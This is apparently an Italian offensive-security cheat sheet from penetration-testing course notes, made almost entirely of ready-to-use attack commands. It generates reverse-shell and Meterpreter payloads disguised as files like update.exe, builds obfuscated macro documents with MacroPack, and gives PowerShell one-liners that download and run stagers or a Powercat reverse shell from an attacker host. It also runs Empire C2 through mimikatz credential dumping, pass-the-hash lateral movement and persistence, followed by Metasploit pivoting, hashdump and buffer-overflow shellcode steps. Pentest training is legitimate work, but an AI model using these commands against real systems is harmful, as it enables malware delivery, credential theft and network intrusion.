| **EXE Meterpreter reverse_tcp** | `msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o backdoor.exe` |
| **EXE x64 Meterpreter** | `msfvenom -p windows/x64/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o update.exe` |
| **EXE shell non-staged** | `msfvenom -p windows/shell_rev⁠erse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` |
| **VBA macro pura** | `msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f vba` |
| **VBA + EXE hex (più affidabile)** | `msfvenom -a x86 --platform windows -p windows/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f vba-exe` |
| **VBA PowerShell (pulita)** | `msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f vba-psh` |
| **HTA PowerShell** | `msfvenom -p windows/shell_rev⁠erse_tcp LHOST=<IP> LPORT=4444 -f hta-psh -o /var/www/html/shell.hta` |
| **PowerShell raw** | `msfvenom -p windows/meter⁠preter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh -o stage.ps1` |
| **Encoder polimorfico** | aggiungi `-e x86/shikata_ga_nai -i 10` |
| **Liste formati** | `msfvenom --list formats` |

### Regole d'oro

- Su Windows **usare sempre `-o file`**, mai `> file` (il redirect rompe il binary).
- Per **Word** convertire `Workbook_Open` → `Document_Open` (default msfvenom è Excel).
- Encoder = piccola assistenza signature-based, NON evade EDR/AMSI moderni.
- Listener handler con **payload identico** a quello generato (es. `reverse_tcp` ↔ `reverse_tcp`).

---

## Client-Side: MacroPack

> **Contesto:** MacroPack automatizza la generazione di documenti Office armati con macro VBA offuscate (rename, encode, strip metadata) + iniezione + cleaning. Tre tabelle: flag, template built-in, pattern d'uso.
> **Origine:** modulo Client-Side Attacks.

### Flag essenziali — pattern d'uso

```cmd
macropack.exe --help
macropack.exe --list-formats
macropack.exe --list-templates

:: Pattern base — CMD via stdin
echo <cmd> | macropack.exe -t cmd -o -G out.doc

:: Pattern pipeline MSF
msfvenom -f vba ... | macropack.exe -o -G resume.doc

:: Pattern dropper EXE
echo http://atk/update.exe | macropack.exe -t dropper -o -G accounts.xls

:: Pattern dropper PowerShell con carrier custom
echo http://atk/stager.ps1 | macropack.exe -t dropper_ps -o --template invoice.doc -G Invoice.doc

:: UAC bypass stub
macropack.exe -f my.vba -o --uac-bypass -G out.doc
```

### Tabella flag

| Flag | Funzione |
|---|---|
| `-f <file>` | Input VBA file |
| `stdin` (pipe) | Input via pipe (es. da `msfvenom`) |
| `-t <template>` | Template predefinito |
| `-o` | **Full obfuscation** (raccomandato sempre) |
| `--obfuscate-form` | Solo spazi/comments |
| `--obfuscate-names` | Rename functions/vars |
| `--obfuscate-strings` | Encode strings letterali |
| `--obfuscate-declares` | Rename Win32 API declares |
| `-G <out>` | Output, ext determina formato |
| `--template <doc>` | Carrier doc custom (pretexting) |
| `--uac-bypass` | UAC bypass stub |
| `--dde` | DDE attack (Excel) |
| `-s <func>` | Override entry-point |
| `-q` | Quiet |
| `--list-formats` | Lista formati supportati |
| `--list-templates` | Lista template payload |

### Template built-in

| Template | Cosa fa |
|---|---|
| `hello` | MsgBox di test |
| **`cmd`** | Esegue comando CMD locale (input via stdin) |
| `remote_cmd` | Esegue cmd e POSTa output a HTTP server |
| **`dropper`** | Scarica + esegue EXE remoto (input: URL) |
| **`dropper_ps`** | Scarica + esegue script PowerShell |
| `dropper_powershell_unc` | Esegue PS via UNC path (SMB) |
| `dropper_dll_meterpreter` | Drop + load DLL Meterpreter |
| `embed_exe` | Embedda EXE nel doc (drop + exec) |
| `embed_dll` | Embedda DLL nel doc |
| `dll` | Genera solo DLL |

### Formati supportati

- **Office**: Word (`doc`, `docm`, `dot`, `dotm`, `docx`), Excel (`xls`, `xlsm`, `xlsx`, `xltm`), PowerPoint (`pptm`, `potm`), Access (`accdb`, `mdb`).
- **Script standalone**: VBS, HTA, WSF, SCT, Shell-Link (LNK).
- **Pro-only**: CHM, symbolic-link.

---

## Client-Side: PowerShell switches per macro

> **Contesto:** combinazione canonica di switch `powershell.exe` per esecuzione stealth da macro / HTA / dropper. Pattern dropper one-liner, reverse shell Powercat, dropper EXE.
> **Origine:** modulo Client-Side Attacks.

| Switch | Significato |
|---|---|
| **`-ExecutionPolicy Bypass`** / **`-ep bypass`** | Bypassa execution policy |
| **`-WindowStyle Hidden`** / **`-w hidden`** | Nasconde finestra PS |
| **`-NoProfile`** / **`-nop`** | Salta profilo (più veloce, meno tracce) |
| **`-NonInteractive`** / **`-noni`** | Modalità non-interattiva |
| **`-Encoded⁠Command <b64>`** / **`-e <b64>`** | Esegue comando base64 (UTF-16LE) |
| **`-Command "..."`** / **`-c "..."`** | Esegue comando inline |
| **`-File <path>`** | Esegue script da file |

### Pattern d'oro dropper one-liner

```text
powershell -nop -w hidden -ep bypass -c "I⁠EX (New-Object Net.Web⁠Client).Download⁠String('http://atk/stager.ps1')"
```

### Pattern reverse shell Powercat

```text
I⁠EX (New-Object Net.Web⁠Client).Download⁠String('http://atk/powercat.ps1'); powercat -c <atk> -p 1337 -e cmd
```

### Pattern dropper EXE

```text
Invoke-WebRequest -Uri 'http://atk/x.exe' -OutFile 'C:\Users\u\x.exe'
Start-Process -FilePath 'C:\Users\u\x.exe'
```

---

## Command & Control: Em⁠pire CLI

> **Contesto:** ciclo completo Em⁠pire — server/client, listener, stager, agent, moduli (enum, credenziali, lateral movement, code execution, persistence, port forwarding). Tutto da CLI; Star⁠killer è la GUI alternativa (`empire_admin/password123`).
> **Origine:** modulo Command & Control (C2).

```text
# === SERVER + CLIENT ===
sudo powershell-empire server                  # tab 1
powershell-empire client                       # tab 2
starkiller                                     # GUI alternativa (login empire_admin/password123)

# === LISTENER ===
uselisteners                                   # lista tipi disponibili
uselistener http
  set Host <kali_ip>
  set Port 8888
  set DefaultDelay 5
  set DefaultJitter 0.0
  execute
main
listeners                                      # lista attivi
kill <listener_name>

# === STAGER ===
usestager multi/launcher
  set Listener http
  set Language powershell
  set Obfuscate True
  execute
# -> copia "powershell -nop -w 1 -enc <base64>"

usestager windows/hta
  set Listener http
  execute
# -> esegui con: mshta http://<empire>/file.hta

# === AGENT ===
agents
rename <id> <nome_leggibile>
interact <nome>

  # Dentro l'agent:
  info
  history
  shell whoami /priv
  sleep 10 0.5                                  # delay 10s, jitter 50%
  back                                          # esce dall'agent

# === MODULE: enum ===
usemodule powershell/situational_awareness/network/winenum
  execute
usemodule powershell/situational_awareness/network/powerview/get_user
  execute
usemodule powershell/situational_awareness/network/portscan
  set Hosts <range>
  execute

# === MODULE: credenziali ===
usemodule powershell/credentials/mimi⁠katz/lsadump
  execute
usemodule powershell/credentials/mimi⁠katz/sekurlsa
  execute
usemodule powershell/credentials/rubeus
  set Command "kerberoast /outfile:/tmp/k.txt"
  execute
creds                                           # lista credenziali raccolte

# === MODULE: lateral movement ===
usemodule powershell/lateral_movement/invoke_smbexec
  set Username administrator
  set Hash <NTLM>
  set ComputerName <ip>
  set Command whoami
  execute

usemodule powershell/lateral_movement/invoke_wmi
  set Username administrator
  set Password '<plain>'
  set ComputerName <ip>
  set Listener http
  execute

# === MODULE: code execution + MSF bridge ===
usemodule powershell/code_execution/invoke_metasploitpayload
  set URL http://<kali>:8080/<rnd>
  execute

# === MODULE: persistence ===
usemodule powershell/persistence/elevated/schtasks
  set Listener http
  set DailyTime 09:00
  execute

# === MODULE: port forwarding ===
usemodule powershell/management/invoke_portfwd
  set ListenAddress <kali>
  set ListenPort 4445
  set ConnectAddress <target>
  set ConnectPort 445
  execute
```

---

## Command & Control: integrazione MSF

> **Contesto:** ricetta end-to-end per generare un URL `web_delivery` Meterpreter da MSF, eseguirlo da un agent Em⁠pire, fare pivot via autoroute + socks_proxy e lanciare exploit interno dietro pivot con payload **bind_tcp** (non reverse).
> **Origine:** modulo Command & Control (C2).

```text
# === GENERA URL WEB_DELIVERY ===
msfconsole
use exploit/multi/script/web_delivery
set TARGET 2                                    # PowerShell
set PAYLOAD windows/meter⁠preter/reverse_tcp
set LHOST <kali>
set LPORT 4444
set URIPATH /
exploit -j

# -> output: http://<kali>:8080/  (one-liner PowerShell)

# === DA EMPIRE LANCIA IL PAYLOAD ===
# (nel client Em⁠pire, dentro l'agent)
usemodule powershell/code_execution/invoke_metasploitpayload
set URL http://<kali>:8080/
execute

# -> in msfconsole arriva "Meterpreter session 1 opened"

# === PIVOTING AUTOROUTE ===
use post/multi/manage/autoroute
set SESSION 1
run
# -> route add automatica per la subnet di session 1

# === SOCKS PROXY ===
use auxiliary/server/socks_proxy
set SRVHOST <kali>
set SRVPORT 1080
set VERSION 5
run -j

# Da Kali host:
proxychains nmap -sT -Pn -p 80,445,3389 <internal_ip>
# Browser Firefox -> SOCKS v5 <kali>:1080

# === EXPLOIT DIETRO PIVOT (BIND, NON REVERSE) ===
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meter⁠preter/bind_tcp        # bind!
set RHOSTS fileserver.ine.local
set LPORT 4445
exploit

# === POST-EX SU FILESERVER ===
sessions -i 2
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
migrate <lsass_pid>
hash⁠dump
```

---

## Buffer Overflows: Mona.py

> **Contesto:** plugin Python di Immunity Debugger. Tutto si lancia dalla command bar in basso con prefisso `!mona`. Sequenza-tipo: config → pattern_create → pattern_offset → modules → bytearray/compare → jmp/seh → msfvenom.
> **Origine:** modulo Exploit Development Buffer Overflows.

### Configurazione iniziale

```
!mona config -set workingfolder c:\mona\%p
```

Crea una cartella per ogni processo debuggato (`%p` = nome processo) dove salva pattern, bytearray, output dei comandi.

### Comandi essenziali

| Comando | Scopo | Output |
|---|---|---|
| `!mona modules` | Tabella protezioni di tutti i moduli caricati | Colonne: Rebase, SafeSEH, ASLR, NXCompat, OS Dll → cercare riga con tutto `False` |
| `!mona pattern_create -l <N>` | Genera cyclic pattern di N byte | Salva in `pattern.txt` |
| `!mona pattern_offset -d <addr>` | Calcola l'offset del valore catturato (EIP o SEH) | "Pattern found at offset N" |
| `!mona bytearray -cpb "\x00..."` | Genera bytearray di `\x01..\xFF` escludendo i bad char già noti | Salva `bytearray.bin` + `bytearray.txt` |
| `!mona compare -f bytearray.bin -a <addr>` | Confronta bytearray atteso vs memoria a partire da `<addr>` | Lista dei byte alterati = bad chars |
| `!mona jmp -r esp -cpb "<bad>"` | Cerca gadget `JMP ESP` (anche `CALL ESP`, `PUSH ESP ; RET`) | Lista indirizzi in moduli "puliti" |
| `!mona jmp -r esp -m <module>` | Idem ma limitato a un modulo specifico | |
| `!mona seh -cpb "<bad>"` | Cerca gadget `POP r32 ; POP r32 ; RET` in moduli senza SafeSEH | Lista indirizzi per SEH overflow |
| `!mona find -s "\xff\xe4" -m <module>` | Ricerca byte arbitraria (alternativa per `JMP ESP` opcode) | |
| `!mona stackpivot` | Cerca stack pivot per ROP | (avanzato, fuori scope) |
| `!mona rop` | Genera ROP chain automatica | (avanzato, fuori scope) |

### Esempio output `!mona modules`

```
Module info :
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
 ----------------------------------------------------------------------------------
 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False    | False   essfunc.dll
 0x77c10000 | 0x77c68000 | 0x00058000 | True   | True    | True  | True     | True    msvcrt.dll
```

→ `essfunc.dll` con tutto `False` = candidato perfetto per gadget.

### Workflow tipico mona (sequenza cronologica)

```
1. !mona config -set workingfolder c:\mona\%p
2. !mona pattern_create -l 3000
3. (post-crash) !mona pattern_offset -d 0x<EIP_or_SEH>
4. !mona modules
5. !mona bytearray -cpb "\x00"
6. (post-crash) !mona compare -f bytearray.bin -a <ESP_addr>
7. !mona jmp -r esp -cpb "<bad>" -m <module>        # stack classico
   OR
   !mona seh -cpb "<bad>"                            # SEH
```

### Shortcut Immunity Debugger utili

| Tasto | Azione |
|---|---|
| **F9** | Run (continua esecuzione) |
| **F7** | Step into |
| **F8** | Step over |
| **F2** | Toggle breakpoint |
| **Shift+F7** | Pass exception to application (CRITICO per SEH workflow) |
| **CTRL+G** | Go to address |
| **CTRL+F2** | Restart |
| **View → SEH chain** | Ispeziona SEH chain del thread corrente |

---

## Buffer Overflows: msfvenom shellcode

> **Contesto:** generazione shellcode (non solo EXE) per exploit BO con `-b` bad chars, encoder polimorfico `shikata_ga_nai`, output formato `c`/`python`/`hex`. Comprende handler `exploit/multi/handler` per Meterpreter.
> **Origine:** modulo Exploit Development Buffer Overflows.

### Sintassi base

```bash
msfvenom -p <payload> [opzioni del payload] [-e <encoder>] [-i <iter>] \
         [-b "<bad>"] -f <format> [-v <varname>] [-o <outfile>]
```

### Payload Windows più usati

| Payload | Uso |
|---|---|
| `windows/exec CMD=calc.exe` | Esegue un comando — POC "etico" (calc.exe, notepad.exe, whoami) |
| `windows/shell_rev⁠erse_tcp LHOST= LPORT=` | Reverse shell cmd.exe (staged: no; **staged** è `windows/shell/reverse_tcp`) |
| `windows/shell_bind_tcp LPORT=` | Bind shell (target apre porta in ascolto) |
| `windows/meter⁠preter/reverse_tcp LHOST= LPORT=` | Meterpreter session (richiede handler msfconsole) |
| `windows/meter⁠preter_reverse_https LHOST= LPORT=` | Meterpreter su HTTPS (più stealth) |
| `windows/messagebox` | Apre una MessageBox — POC innocua |
| `windows/x64/...` | Equivalenti 64-bit (non in scope del corso) |

### Flag chiave

| Flag | Significato | Esempio |
|---|---|---|
| `-p` | Payload | `-p windows/shell_rev⁠erse_tcp` |
| `-b` | Bad chars da evitare | `-b "\x00\x0a\x0d"` |
| `-f` | Formato output | `-f c`, `-f python`, `-f exe`, `-f raw`, `-f hex` |
| `-v` | Nome variabile | `-v shellcode` |
| `-o` | File di output | `-o payload.exe` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` (poliforfico, default) |
| `-i` | Iterazioni encoder | `-i 5` (5 round di encoding) |
| `-a` | Architettura | `-a x86`, `-a x64` |
| `--platform` | Piattaforma | `--platform windows` |
| `-l <type>` | Lista payload/encoder/formati | `msfvenom -l payloads` |
| `--list-options` | Opzioni di un payload specifico | `msfvenom -p windows/shell_rev⁠erse_tcp --list-options` |

### Esempi pronti all'uso

**Reverse shell per BO (con bad chars HTTP):**
```bash
msfvenom -p windows/shell_rev⁠erse_tcp LHOST=10.10.10.10 LPORT=4444 \
         -b "\x00\x0a\x0d\x20\x26\x3d" \
         -e x86/shikata_ga_nai -i 3 \
         -f python -v shellcode
```

**POC calc.exe (demo):**
```bash
msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python -v shellcode
```

**Meterpreter su HTTPS:**
```bash
msfvenom -p windows/meter⁠preter_reverse_https LHOST=10.10.10.10 LPORT=443 \
         -f exe -o meterp.exe
```

**Output C (per inclusione in exploit C/C++):**
```bash
msfvenom -p windows/shell_rev⁠erse_tcp LHOST=... LPORT=... -b "\x00" -f c
```

### Handler msfconsole

Per Meterpreter o staged payload serve il listener di Metasploit:

```
msfconsole -q -x "use exploit/multi/handler;
set PAYLOAD windows/meter⁠preter/reverse_tcp;
set LHOST 10.10.10.10;
set LPORT 4444;
set ExitOnSession false;
run -j"
```

Per shell semplici basta `nc -lvnp 4444`.
